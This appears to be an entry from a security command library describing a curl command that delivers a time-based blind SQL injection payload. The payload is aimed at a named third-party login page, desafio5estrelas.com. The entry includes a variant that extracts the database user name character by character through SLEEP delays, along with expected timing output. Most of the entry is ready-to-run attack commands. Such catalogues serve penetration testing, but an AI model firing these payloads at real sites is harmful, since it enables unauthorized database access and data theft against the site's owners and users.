---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: >-
  curl -s -w "Total time: %{time_total}s\n" -o /dev/null
  "https://desafio5estrelas.com/login?codigo=1' AND IF(1=1, SLEEP(5), 0)-- -"
tags:
  - sqli
  - timing
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T03:46:25.889Z'
verified: false
validated: true
submitted: true
---
# curl-timing-payload

## Command

```bash
curl -s -w "Total time: %{time_total}s\n" -o /dev/null "https://desafio5estrelas.com/login?codigo=1' AND IF(1=1, SLEEP(5), 0)-- -"
```

## Description

This curl command sends an HTTP GET request to a target URL with a time-based SQL injection payload, suppressing output (-s) and measuring total response time (-w) to detect delays indicative of successful injection. Use it to test blind SQLi vulnerabilities in web parameters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode, no progress meter | Yes |
| `-w "%{time_total}s\n"` | Write total time in seconds to stdout | Yes |
| `-o /dev/null` | Discard response body | Yes |
| URL with payload | Target endpoint and injected SQL | Yes |

## Examples

### Basic Usage

```bash
curl -s -w "Total time: %{time_total}s\n" -o /dev/null "https://example.com/login?param=1' AND SLEEP(5)-- -"
```

### Advanced Usage

```bash
curl -s -w "Total time: %{time_total}s\n" -o /dev/null -H "User-Agent: Mozilla/5.0" "https://desafio5estrelas.com/login?codigo=1' AND IF(ASCII(SUBSTRING(user,1,1))='a', SLEEP(5), 0)-- -"
```

## Expected Output

Total time: 5.123s

A response time significantly longer than baseline (e.g., >5s for SLEEP(5)) indicates successful injection.

## Related

- [[Related Procedure: Exploit-Time-Based-Blind-MySQL-SQL-Injection]]
